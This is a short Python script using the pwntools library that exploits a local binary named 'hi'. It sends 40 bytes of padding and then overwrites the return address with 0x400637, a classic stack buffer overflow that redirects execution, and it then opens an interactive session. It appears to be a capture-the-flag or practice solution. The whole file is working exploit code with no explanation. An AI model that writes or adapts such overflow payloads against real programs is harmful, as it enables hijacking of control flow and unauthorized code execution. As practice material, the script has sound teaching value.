from pwn import *
context.binary = "./hi"
p = process()
msg = b"A"*32 + b"A"*8 + p64(0x0000000000400637)
p.sendline(msg)
p.interactive()
